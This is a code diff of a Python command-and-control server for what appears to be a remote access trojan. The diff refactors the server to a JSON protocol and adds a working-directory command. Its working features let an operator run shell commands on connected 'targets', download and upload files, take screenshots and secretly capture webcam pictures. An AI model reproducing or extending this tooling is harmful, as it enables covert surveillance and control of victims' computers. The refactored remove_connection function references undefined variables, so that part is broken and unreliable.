@@ -3,6 +3,7 @@
 import sys
 import base64
 import socket
+import json
 from threading import Thread
 # non-standard libraries
 import texttable
@@ -10,7 +11,7 @@ import texttable
 
 class Server:
     def __init__(self):
-        self.cmd_timeout = 30
+        self.timeout = 3
         self.zip_compression_level = 0
         self.camera_port = 0
         self.connection = Connection()
@@ -23,7 +24,7 @@ class Server:
 
                 if command == "h":
                     self.print_help()
-                elif command == "o" and len(attribute[0].split()) == 2 and attribute[0].split()[0].lower() in ["cmd_timeout", "zip_compression", "camera_port"]:
+                elif command == "o" and len(attribute[0].split()) == 2 and attribute[0].split()[0].lower() in ["timeout", "zip_compression", "camera_port"]:
                     self.set_option(attribute[0].split()[0].lower(), attribute[0].split()[1])
                 elif command == "l" and len(attribute):
                     self.generate_texttable(self.get_conn_fgoi(attribute[0].split()))
@@ -33,6 +34,17 @@ class Server:
                     self.remove_connection(self.get_conn_fgoi(attribute[0].split()))
                 elif command == "g" and len(attribute) == 2 and attribute[0].split()[0].lower() in ["add", "rm"]:
                     self.edit_group(attribute[0].split()[0].lower(), self.get_conn_fgoi(attribute[0].split()[0:]), attribute[1].split())
+                elif command == "f" and len(attribute) == 2 and attribute[0].split()[0] in ["set", "get"]:
+                    if attribute[0].split()[0] == "set":
+                        if len(attribute[0].split()) == 2:
+                            self.cwd(attribute[0].split()[0], attribute[0].split()[1], self.get_conn_fgoi(attribute[1].split()))
+                        else:
+                            print("[-] InvalidInputError")
+                    elif attribute[0].split()[0] == "get":
+                        if len(attribute[0].split()) == 1:
+                            self.cwd(attribute[0].split()[0], "", self.get_conn_fgoi(attribute[1].split()))
+                        else:
+                            print("[-] InvalidInputError")
                 elif command == "c" and len(attribute) == 2:
                     self.execute_command(attribute[0], self.get_conn_fgoi(attribute[1].split()))
                 elif command == "d" and len(attribute) == 3:
@@ -55,11 +67,12 @@ class Server:
 
     def print_help(self):
         print("h show this page")
-        print("o [cmd_timeout/zip_compression/camera_port] [value] set option")
+        print("o [timeout/zip_compression/camera_port] [value] set option")
         print("l [clients] list clients")
         print("t [tag] @ [clients] change tag")
         print("r [clients] close and remove connection")
         print("g [add/rm] [clients] @ [group name] change group")
+        print("f [set/get] [path] @ [clients] set or get current working directory")
         print("c [command] @ [clients]  execute console command")
         print("d [path to open] @ [path to save] @ [clients] download file from target")
         print("u [path to open] @ [path to save] @ [clients] upload file to target")
@@ -70,18 +83,19 @@ class Server:
 
     def generate_texttable(self, connections):
         table = texttable.Texttable()
+        table.set_deco(texttable.Texttable.HEADER)
         rows = [["INDEX", "ADDRESS", "PORT", "TAG", "GROUPS"]]
-        for index, (connection, address, port, tag, groups) in enumerate(self.connection.connections):
-            if connection in connections:
-                rows.append([index, address, port, tag, ", ".join(groups)])
+        for index, session in enumerate(self.connection.connections):
+            if session["connection"] in connections:
+                rows.append([index, session["address"], session["port"], session["tag"], ", ".join(session["groups"])])
         table.add_rows(rows)
         print(table.draw())
 
     def set_option(self, option, value):
         option = option.lower()
-        if option == "cmd_timeout":
+        if option == "timeout":
             try:
-                self.cmd_timeout = int(value)
+                self.timeout = int(value)
             except ValueError:
                 print("[-] InvalidTimeout")
         elif option == "zip_compression":
@@ -104,56 +118,72 @@ class Server:
             print("[-] UnknownOption")
 
     def change_tag(self, tag, connections):
-        for index, (connection, _, _, _, _) in enumerate(self.connection.connections):
-            if connection in connections:
-                self.connection.connections[int(index)][3] = tag
+        for index, session in enumerate(self.connection.connections):
+            if session["connection"] in connections:
+                self.connection.connections[index]["tag"] = tag
 
     def remove_connection(self, connections):
-        remove_entries = list()
-        for entry in self.connection.connections:
-            connection, _, _, _, _ = entry
-            if connection in connections:
+        request = {"cmd": "r",
+                   "timeout": self.timeout}
+        for session in list(self.connection.connections):
+            if session["connection"] in connections:
                 try:
-                    self.connection.send("r".encode(self.connection.CODEC), connection)
+                    self.connection.send(self.enc_request(request), session["connection"])
                 except socket.error:
                     pass
                 connection.close()
-                remove_entries.append(entry)
-        for entry in remove_entries:
-            self.connection.connections.remove(entry)
+                self.connection.connections.remove(entry)
 
     def edit_group(self, mode, connections, group_names):
         if mode == "add":
-            for index, (connection, _, _, _, _) in enumerate(self.connection.connections):
-                if connection in connections:
+            for index, session in enumerate(self.connection.connections):
+                if session["connection"] in connections:
                     for name in group_names:
-                        if name not in self.connection.connections[index][4]:
-                            self.connection.connections[index][4].append(name)
+                        if name not in self.connection.connections[index]["groups"]:
+                            self.connection.connections[index]["groups"].append(name)
                         else:
                             print("[-] TargetAlreadyInGroup")
 
         elif mode == "rm":
-            for index, (connection, _, _, _, _) in enumerate(self.connection.connections):
-                if connection in connections:
+            for index, session in enumerate(self.connection.connections):
+                if session["connection"] in connections:
                     for name in group_names:
                         try:
-                            self.connection.connections[index][4].remove(name)
+                            self.connection.connections[index]["groups"].remove(name)
                         except ValueError:
                             print("[-] TargetNotInGroup")
 
-    def execute_command(self, command, connections):
-        data = ("c" + str(self.cmd_timeout) + " " + command).encode(self.connection.CODEC)
+    def cwd(self, mode, path, connections):
+        request = {"cmd": "f",
+                   "mode": mode,
+                   "path": path,
+                   "timeout": self.timeout}
         for connection in connections:
             try:
-                self.connection.send(data, connection)
-                print(self.connection.recv(connection).decode(self.connection.CODEC))
+                self.connection.send(self.enc_request(request), connection)
+                response = self.dec_response(self.connection.recv(connection))
+                print(response["out"] + response["error"])
+            except socket.error as error:
+                self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)) + "\n")
+
+    def execute_command(self, exe, connections):
+        request = {"cmd": "c",
+                   "exe": exe,
+                   "timeout": self.timeout}
+        for connection in connections:
+            try:
+                self.connection.send(self.enc_request(request), connection)
+                response = self.dec_response(self.connection.recv(connection))
+                print(response["data"] + response["error"])
             except socket.error as error:
                 self.update_line("\r[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)) + "\n")
 
     def download_file(self, path_to_open, path_to_save, connections):
+        request = {"cmd": "d",
+                   "open_path": path_to_open}
         for connection in connections:
             try:
-                self.connection.send(("d" + path_to_open).encode(self.connection.CODEC), connection)
+                self.connection.send(self.enc_request(request), connection)
                 header = self.connection.recv(connection).decode(self.connection.CODEC)
                 if header.startswith("[-]"):
                     print(header)
@@ -174,6 +204,8 @@ class Server:
             print()
 
     def upload_file(self, path_to_open, path_to_save, connections):
+        request = {"cmd": "u",
+                   "save_path": path_to_save}
         try:
             with open(path_to_open, "rb") as file:
                 data = base64.b64encode(file.read()) + self.connection.END_MARKER
@@ -185,7 +217,7 @@ class Server:
             for connection in connections:
                 try:
                     len_data_total = len(data)
-                    self.connection.send(("u" + path_to_save).encode(self.connection.CODEC), connection)
+                    self.connection.send(self.enc_request(request), connection)
                     while data:
                         connection.send(data[:1024])
                         data = data[1024:]
@@ -198,56 +230,70 @@ class Server:
                 print()
 
     def make_screenshot(self, monitor, path_to_save, connections):
+        request = {"cmd": "s",
+                   "monitor": monitor,
+                   "save_path": path_to_save,
+                   "timeout": self.timeout}
         for connection in connections:
             try:
-                data = ("s" + monitor + " " + path_to_save).encode(self.connection.CODEC)
-                self.connection.send(data, connection)
-                response = self.connection.recv(connection).decode(self.connection.CODEC)
-                if response.startswith("[-]"):
-                    print(response)
+                self.connection.send(self.enc_request(request), connection)
+                response = self.dec_response(self.connection.recv(connection))
+                print(response["error"])
             except socket.error as error:
                 print("[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
 
     def zip_file_or_folder(self, path_to_open, path_to_save, connections):
+        request = {"cmd": "z",
+                   "comp_lvl": self.zip_compression_level,
+                   "open_path": path_to_open,
+                   "save_path": path_to_save,
+                   "timeout": self.timeout}
         for connection in connections:
             try:
-                self.connection.send(("z" + str(self.zip_compression_level) + path_to_open + " @ " + path_to_save).encode(self.connection.CODEC), connection)
-                response = self.connection.recv(connection).decode(self.connection.CODEC)
-                if response.startswith("[-]"):
-                    print(response)
+                self.connection.send(self.enc_request(request), connection)
+                response = self.dec_response(self.connection.recv(connection))
+                print(response["error"])
             except socket.error as error:
                 print("[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
 
     def capture_camera_picture(self, path_to_save, connections):
+        request = {"cmd": "w",
+                   "cam_port": self.camera_port,
+                   "path_to_save": path_to_save,
+                   "timeout": self.timeout}
         for connection in connections:
             try:
-                self.connection.send(("w" + str(self.camera_port) + " " + path_to_save).encode(self.connection.CODEC), connection)
-                response = self.connection.recv(connection).decode(self.connection.CODEC)
-                if response.startswith("[-]"):
-                    print(response)
+                self.connection.send(self.enc_request(request), connection)
+                response = self.dec_response(self.connection.recv(connection))
+                print(response["error"])
             except socket.error as error:
                 print("[-] SocketError: " + str(error) + ": " + str(self.get_index_by_connection(connection)))
 
     def get_conn_fgoi(self, objects):  # get connections from groups or indexs
         connections = list()
-        for obj in objects:
-            for index, (connection, _, _, _, groups) in enumerate(self.connection.connections):
-                if obj in groups:
-                    if connection not in connections:
-                        connections.append(connection)
-                elif str(index) == obj:
-                    if connection not in connections:
-                        connections.append(self.connection.connections[int(index)][0])
+        for goi in objects:
+            for index, session in enumerate(self.connection.connections):
+                if session["connection"] not in connections:
+                    if goi in session["groups"]:
+                        connections.append(session["connection"])
+                    elif goi == str(index):
+                        connections.append(session["connection"])
         return connections
 
     def get_index_by_connection(self, searched_connection):
-        for index, (connection, _, _, _, _) in enumerate(self.connection.connections):
-            if searched_connection == connection:
+        for index, session in enumerate(self.connection.connections):
+            if searched_connection == session["connection"]:
                 return index
 
     def update_line(self, text):
         sys.stdout.write(text)
         sys.stdout.flush()
+
+    def enc_request(self, request):
+        return json.dumps(request).encode(self.connection.CODEC)
+
+    def dec_response(self, response):
+        return json.loads(response.decode(self.connection.CODEC))
 
 
 class Connection:
@@ -265,15 +311,19 @@ class Connection:
 
         self.sock.bind((HOST, PORT))
         print("[*] server running")
-        accepting_thread = Thread(target=self.accept_new_connections, args=(self.sock,))
-        accepting_thread.start()
+        Thread(target=self.accept_new_connections, args=(self.sock,)).start()
         print("[*] waiting for clients")
 
     def accept_new_connections(self, sock):
         while True:
             sock.listen()
             connection, (address, port) = sock.accept()
-            self.connections.append([connection, address, port, "no tag", ["all"]])
+            session = {"connection": connection,
+                       "address": address,
+                       "port": port,
+                       "tag": "no tag",
+                       "groups": ["all"]}
+            self.connections.append(session)
 
     def send(self, data, connection):
         data = base64.b64encode(data) + self.END_MARKER
